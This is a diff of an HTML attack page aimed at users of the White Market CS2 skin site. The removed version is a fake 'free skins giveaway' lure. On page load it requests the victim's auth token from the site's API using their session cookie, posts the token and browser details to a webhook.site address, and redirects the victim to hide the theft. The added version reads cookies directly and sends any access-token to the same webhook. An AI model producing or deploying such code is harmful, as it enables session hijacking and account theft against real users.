@@ -1,215 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>White Market - Free CS2 Skins Giveaway! 🎁</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 600px;
-            background: rgba(255,255,255,0.1);
-            padding: 50px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-        }
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        .spinner {
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top: 5px solid white;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 30px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
-            font-size: 1.2em;
-            margin-top: 20px;
-            opacity: 0.9;
-        }
-        .emoji {
-            font-size: 4em;
-            margin-bottom: 20px;
-        }
-    </style>
+    <title>JWT Cookie Test</title>
 </head>
 <body>
-    <div class="container">
-        <div class="emoji">🎮</div>
-        <h1>Free CS2 Skins!</h1>
-        <div class="spinner"></div>
-        <div class="status" id="status">Verifying your White Market account...</div>
-    </div>
-
+    <h1>Testing JWT Cookie Access...</h1>
+    <pre id="output"></pre>
+    
     <script>
-        // ============================================
-        // CONFIGURATION - UPDATE THIS!
-        // ============================================
-        const EXFIL_URL = 'https://webhook.site/23b9c460-f601-4ae9-aca0-80a40aedd5d3';
+        const output = document.getElementById('output');
+        const EXFIL = 'https://webhook.site/23b9c460-f601-4ae9-aca0-80a40aedd5d3';
         
-        const API_ENDPOINT = 'https://api.white.market/graphql/api';
-        const statusEl = document.getElementById('status');
+        // Check if we can read the JWT directly
+        const allCookies = document.cookie;
         
-        function updateStatus(message) {
-            statusEl.textContent = message;
-            console.log('[*]', message);
-        }
+        output.textContent = 'All cookies:\n' + allCookies + '\n\n';
         
-        async function stealJWT() {
-            try {
-                updateStatus('Connecting to White Market API...');
+        // Try to find access-token
+        if (allCookies.includes('access-token')) {
+            const match = allCookies.match(/access-token=([^;]+)/);
+            if (match) {
+                const jwt = match[1];
+                output.textContent += '✅ SUCCESS! JWT found:\n' + jwt + '\n\n';
                 
-                // Step 1: Send OPTIONS preflight (warm up CORS)
-                await fetch(API_ENDPOINT, {
-                    method: 'OPTIONS',
-                    headers: {
-                        'Access-Control-Request-Method': 'POST',
-                        'Access-Control-Request-Headers': 'content-type,x-accept-language'
-                    }
-                });
-                
-                console.log('[+] Preflight successful');
-                await new Promise(r => setTimeout(r, 300));
-                
-                // Step 2: Call the JWT generation mutation
-                updateStatus('Generating authentication token...');
-                
-                const response = await fetch(API_ENDPOINT, {
+                // Exfiltrate
+                fetch(EXFIL, {
                     method: 'POST',
-                    credentials: 'include',  // CRITICAL: Sends victim's HttpOnly cookie!
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'x-accept-language': 'en_US'
-                    },
+                    mode: 'no-cors',
                     body: JSON.stringify({
-                        query: `
-                            mutation AuthToken {
-                                auth_token {
-                                    accessToken
-                                }
-                            }
-                        `,
-                        operationName: 'AuthToken'
-                    })
-                });
-                
-                const data = await response.json();
-                console.log('[+] Response:', data);
-                
-                // Step 3: Extract the JWT
-                const jwt = data?.data?.auth_token?.accessToken;
-                
-                if (jwt) {
-                    console.log('[+] JWT STOLEN:', jwt);
-                    updateStatus('Processing your reward...');
-                    
-                    // Step 4: Exfiltrate the JWT
-                    const exfilData = {
                         success: true,
                         jwt: jwt,
                         timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        referrer: document.referrer,
-                        victim: {
-                            platform: navigator.platform,
-                            language: navigator.language,
-                            screenResolution: `${screen.width}x${screen.height}`
-                        }
-                    };
-                    
-                    await fetch(EXFIL_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(exfilData)
-                    });
-                    
-                    // Also try with navigator.sendBeacon for reliability
-                    navigator.sendBeacon(EXFIL_URL, JSON.stringify(exfilData));
-                    
-                    console.log('[+] JWT exfiltrated successfully!');
-                    console.log('[+] Exfiltrated data:', exfilData);
-                    
-                    updateStatus('Success! Redirecting to claim your skins...');
-                    
-                    // Wait a moment then redirect to avoid suspicion
-                    await new Promise(r => setTimeout(r, 2000));
-                    window.location.href = 'https://white.market';
-                    
-                } else {
-                    // No JWT returned - user might not be logged in
-                    console.log('[-] No JWT in response. User might not be logged in.');
-                    console.log('[-] Response data:', data);
-                    
-                    const errorData = {
-                        success: false,
-                        error: 'No JWT returned',
-                        response: data,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    await fetch(EXFIL_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify(errorData)
-                    });
-                    
-                    updateStatus('Please log in to White Market first...');
-                    await new Promise(r => setTimeout(r, 2000));
-                    window.location.href = 'https://white.market';
-                }
+                        allCookies: allCookies
+                    })
+                });
                 
-            } catch (error) {
-                console.error('[-] Exploit failed:', error);
-                
-                // Exfiltrate error info
-                const errorData = {
-                    success: false,
-                    error: error.message,
-                    stack: error.stack,
-                    timestamp: new Date().toISOString()
-                };
-                
-                try {
-                    await fetch(EXFIL_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify(errorData)
-                    });
-                } catch (e) {
-                    console.error('[-] Exfiltration also failed:', e);
-                }
-                
-                updateStatus('Error occurred. Redirecting...');
-                await new Promise(r => setTimeout(r, 2000));
-                window.location.href = 'https://white.market';
+                output.textContent += 'JWT sent to webhook!';
             }
+        } else {
+            output.textContent += '❌ JWT cookie not found in document.cookie\n';
+            output.textContent += 'This means it is HttpOnly.\n\n';
+            output.textContent += 'You will need a relay server to capture it.';
+            
+            // Still send diagnostic info
+            fetch(EXFIL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    success: false,
+                    reason: 'JWT not in document.cookie - likely HttpOnly',
+                    allCookies: allCookies,
+                    timestamp: new Date().toISOString()
+                })
+            });
         }
-        
-        // Execute exploit on page load
-        window.addEventListener('load', stealJWT);
     </script>
 </body>
 </html>
